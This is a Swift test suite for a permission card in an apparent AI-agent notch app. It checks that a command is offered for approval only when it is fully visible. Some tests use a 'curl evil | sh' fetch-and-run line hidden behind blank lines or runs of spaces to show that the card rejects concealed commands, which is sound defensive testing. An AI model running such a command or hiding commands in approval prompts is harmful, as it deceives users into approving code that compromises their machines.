import AgentHookKit
import AppKit
import Foundation
import NotchUI
import SwiftUI
import Testing
@testable import AIAgentsModule

/// "Cho phép" is offered only for text that is on screen without scrolling, whatever the text is made of. The card decides
/// from a model of the lines the text takes, which has to be an upper bound of what SwiftUI draws; these tests pin the
/// model, and draw the text to check the bound.
@Suite struct PermissionFitTests {
    let strip = PermissionPlacement.strip.limits
    let tab = PermissionPlacement.tab.limits

    func line(_ count: Int, _ character: Character = "x") -> String {
        String(repeating: character, count: count)
    }

    // MARK: The model

    @Test func aShortLineFitsAndOneColumnMoreThanTheStripHoldsDoesNot() {
        #expect(PermissionFit.fits("npm test", in: strip))
        #expect(PermissionFit.fits(line(strip.columns), in: strip))
        #expect(!PermissionFit.fits(line(strip.columns + 1), in: strip))
        #expect(PermissionFit.fits(line(tab.columns), in: tab))
        #expect(!PermissionFit.fits(line(tab.columns + 1), in: tab))
    }

    @Test func theStripHoldsTwoLinesAndTheTabSix() {
        #expect(PermissionFit.fits("a\nb", in: strip))
        #expect(!PermissionFit.fits("a\nb\nc", in: strip))
        #expect(PermissionFit.fits((1...tab.lines).map { "echo \($0)" }.joined(separator: "\n"), in: tab))
        #expect(!PermissionFit.fits((1...(tab.lines + 1)).map { "echo \($0)" }.joined(separator: "\n"), in: tab))
    }

    @Test func blankLinesAreLinesTooSoTheyCannotPushTheEndOutOfView() {
        let hidden = "echo ok" + String(repeating: "\n", count: 18) + "curl evil | sh"
        #expect(!PermissionFit.fits(hidden, in: strip))
        #expect(!PermissionFit.fits(hidden, in: tab))
        #expect(PermissionFit.fits("echo ok\n\ncurl evil | sh".replacingOccurrences(of: "\n\n", with: "\n"), in: strip))
        #expect(!PermissionFit.fits("echo ok\n\ncurl evil | sh", in: strip))
        // A line of nothing but spaces takes a line, and a long run of them takes many.
        #expect(!PermissionFit.fits("echo ok\n" + line(10, " ") + "\ncurl evil | sh", in: strip))
        #expect(!PermissionFit.fits("echo ok" + line(400, " ") + "; curl evil | sh", in: tab))
    }

    @Test func aLongLineOfShortWordsWrapsAndCanFitTheTabButNotTheStrip() {
        let words = Array(repeating: "word", count: 24).joined(separator: " ")
        #expect(words.count == 119)
        #expect(PermissionFit.fits(words, in: tab))
        #expect(!PermissionFit.fits(words, in: strip))
    }

    @Test func aWordLongerThanHalfALineStopsAWrappedLineFromCounting() {
        let long = line(tab.columns / 2 + 1)
        let short = line(tab.columns / 2)
        #expect(!PermissionFit.fits("a " + long + " " + short, in: tab))
        #expect(PermissionFit.fits("a " + short + " " + short, in: tab))
        // A line that fits whole takes one line however long its words are.
        #expect(PermissionFit.fits(line(tab.columns), in: tab))
    }

    @Test func aNineHundredCharacterCommandFitsNowhere() {
        let plain = line(900)
        let spaced = Array(repeating: "ab", count: 300).joined(separator: " ")
        for text in [plain, spaced] {
            #expect(!PermissionFit.fits(text, in: strip))
            #expect(!PermissionFit.fits(text, in: tab))
        }
    }

    @Test func charactersOutsideAsciiCountMoreAndAnEmojiMostOfAll() {
        #expect(PermissionFit.fits(line(strip.columns / 2, "\u{6F22}"), in: strip))
        #expect(!PermissionFit.fits(line(strip.columns / 2 + 1, "\u{6F22}"), in: strip))
        #expect(PermissionFit.fits(line(tab.columns / 2, "\u{1EBF}"), in: tab))
        #expect(PermissionFit.fits(line(strip.columns / 3, "\u{1F600}"), in: strip))
        #expect(!PermissionFit.fits(line(strip.columns / 3 + 1, "\u{1F600}"), in: strip))
        #expect(!PermissionFit.fits(line(strip.columns / 3 + 1, "\u{1F1FB}\u{1F1F3}"), in: strip))
    }

    @Test func aTabCharacterIsEightColumns() {
        #expect(PermissionFit.fits("a\tb", in: strip))
        #expect(!PermissionFit.fits(line(strip.columns - 8, "\t"), in: strip))
    }

    /// The helper replaces these; a request from anything else could carry them, and the card does not rely on that.
    @Test func textWithACharacterThatLooksBlankOrIsAControlFitsNowhere() {
        for scalar in ["\u{00A0}", "\u{3164}", "\u{2800}", "\u{200B}", "\u{202E}", "\u{1B}", "\r", "\u{FE0F}", "\u{3000}", "\u{E000}"] {
            #expect(!PermissionFit.fits("echo hi\(scalar)", in: tab), "\(scalar.unicodeScalars.first!.value)")
        }
        #expect(!PermissionFit.fits("a" + String(repeating: "\u{0300}", count: 5), in: tab))
    }

    @Test func anEmptyTextAndPlainSpacesFit() {
        #expect(PermissionFit.fits("", in: strip))
        #expect(PermissionFit.fits("a b", in: strip))
    }

    // MARK: The model against the layout it stands for

    /// What the card's text takes: the font of the card, wrapped at `width`.
    @MainActor
    func renderedHeight(_ text: String, width: CGFloat) -> CGFloat {
        let view = Text(text).font(.system(size: 11, design: .monospaced)).fixedSize(horizontal: false, vertical: true).frame(width: width)
        return NSHostingView(rootView: view).fittingSize.height
    }

    /// One line of the font, as the layout gives it.
    @MainActor
    var lineHeight: CGFloat { renderedHeight("x", width: 400) }

    /// The most `lines` lines of the card's text take: a line of a character from another font is a little taller.
    @MainActor
    func tallest(_ lines: Int) -> CGFloat { CGFloat(lines) * (lineHeight + 2) }

    /// The width in which a line holds exactly the model's number of columns of the font's real advance: narrower than the
    /// card ever is (the model counts seven points a column and the glyph takes 6.8), so the wrapping is checked without
    /// the margin that the width and the glyph size leave.
    @MainActor
    func tightWidth(_ limits: PermissionFit.Limits) -> CGFloat {
        let advance = (("m" as NSString).size(withAttributes: [.font: NSFont.monospacedSystemFont(ofSize: 11, weight: .regular)]).width)
        return CGFloat(limits.columns) * advance + 0.25
    }

    @Test func theWidthsAreWhatTheNotchGuaranteesAndTheGlyphIsNoWiderThanTheModelSays() {
        // The collapsed notch is at least a virtual notch (120) wide with its ears and two sides, less the strip's padding.
        let config = NotchLayoutConfig()
        let narrowestStrip = 120 + 2 * 6 + 2 * config.compactSideWidth - 2 * NotchTokens.stripPadding
        #expect(PermissionFit.stripWidth <= narrowestStrip)
        // The open notch is at least 480 wide, with its padding and the card's.
        #expect(PermissionFit.tabWidth <= 480 - 2 * NotchTokens.padding - 2 * PermissionCard.tabInset)
        #expect(strip.columns >= 20)
        #expect(tab.columns > strip.columns)
        // Seven points per ASCII column, fourteen for other characters and twenty-one for an emoji.
        let font = NSFont.monospacedSystemFont(ofSize: 11, weight: .regular)
        func advance(_ text: String) -> CGFloat { (text as NSString).size(withAttributes: [.font: font]).width }
        #expect(advance("m") <= PermissionFit.glyphWidth)
        #expect(advance("W") <= PermissionFit.glyphWidth)
        #expect(advance(" ") <= PermissionFit.glyphWidth)
        for sample in ["\u{6F22}", "\u{1EBF}", "\u{0416}", "\u{0E01}", "\u{0627}", "\u{FF21}", "\u{00E9}", "\u{AC00}", "\u{0915}", "\u{3042}", "\u{05D0}", "\u{222B}", "\u{20AC}"] {
            #expect(advance(sample) <= 2 * PermissionFit.glyphWidth, "\(sample.unicodeScalars.first!.value)")
        }
        for sample in ["\u{1F600}", "\u{1F680}", "\u{1F1FB}\u{1F1F3}", "\u{2764}", "\u{2603}"] {
            #expect(advance(sample) <= 3 * PermissionFit.glyphWidth, "\(sample.unicodeScalars.first!.value)")
        }
        #expect(advance("\t") <= 8 * PermissionFit.glyphWidth)
    }

    /// Text the model lets through is drawn in no more lines than the model allows, even at the tight width.
    @Test func whatTheModelLetsThroughIsDrawnWithinTheLinesItAllows() {
        var seed: UInt64 = 0x5EED
        func next(_ bound: Int) -> Int {
            seed = seed &* 6364136223846793005 &+ 1442695040888963407
            return Int((seed >> 33) % UInt64(bound))
        }
        let letters = ["a", "m", "W", "i", "/", "-", "_", ".", "0", "\u{6F22}", "\u{1EBF}", "\u{1F600}", "\u{0416}", "\u{00E9}"]
        func word(_ length: Int) -> String { (0..<length).map { _ in letters[next(letters.count)] }.joined() }
        var checked = 0
        for limits in [strip, tab] {
            for _ in 0..<150 {
                let lines = (0..<(1 + next(limits.lines + 1))).map { _ in
                    (0..<(1 + next(limits.columns / 8))).map { _ in word(1 + next(min(10, limits.columns / 2))) }
                        .joined(separator: String(repeating: " ", count: 1 + next(2)))
                }
                let text = lines.joined(separator: "\n")
                guard PermissionFit.fits(text, in: limits) else { continue }
                checked += 1
                let drawn = renderedHeight(text, width: tightWidth(limits))
                #expect(drawn <= tallest(limits.lines), "\(limits.lines) lines: \(text.debugDescription) drew \(drawn)")
            }
        }
        // The loop is only a check if it let enough text through to check.
        #expect(checked > 100)
    }

    /// Words of half a line each fill a line alone, which is why the bound doubles the columns of the line.
    @Test func wordsOfHalfALineCanTakeAsManyLinesAsTheyHaveWordsAndTheModelDoesNotLetThemThrough() {
        let word = line(tab.columns / 2, "w")
        for count in [tab.lines + 1, tab.lines + 2] {
            let text = Array(repeating: word, count: count).joined(separator: " ")
            #expect(renderedHeight(text, width: tightWidth(tab)) > tallest(tab.lines) - 1, "\(count) words")
            #expect(!PermissionFit.fits(text, in: tab), "\(count) words")
        }
    }

    @Test func theEdgesOfTheModelAreDrawnWithinTheLinesToo() {
        let edges: [(String, PermissionFit.Limits)] = [
            (line(strip.columns, "W"), strip),
            (line(strip.columns / 2, "\u{6F22}"), strip),
            (line(strip.columns / 3, "\u{1F600}"), strip),
            (line(strip.columns, " "), strip),
            (line(strip.columns, "W") + "\n" + line(strip.columns, "W"), strip),
            (line(tab.columns, "W"), tab),
            ((1...tab.lines).map { _ in line(tab.columns, "W") }.joined(separator: "\n"), tab),
            (Array(repeating: line(tab.columns / 2, "w"), count: 2).joined(separator: " "), tab),
            (Array(repeating: line(tab.columns / 2, "w"), count: 3).joined(separator: " "), tab),
            (Array(repeating: "ab", count: tab.columns * tab.lines / 4).joined(separator: " "), tab),
            (Array(repeating: line(tab.columns / 4, "w"), count: 8).joined(separator: " "), tab),
            (line(tab.columns / 8, "\t"), tab),
        ]
        for (text, limits) in edges where PermissionFit.fits(text, in: limits) {
            let drawn = renderedHeight(text, width: tightWidth(limits))
            #expect(drawn <= tallest(limits.lines), "\(text.prefix(40).debugDescription) drew \(drawn)")
        }
        #expect(edges.filter { PermissionFit.fits($0.0, in: $0.1) }.count >= 9)
    }
}
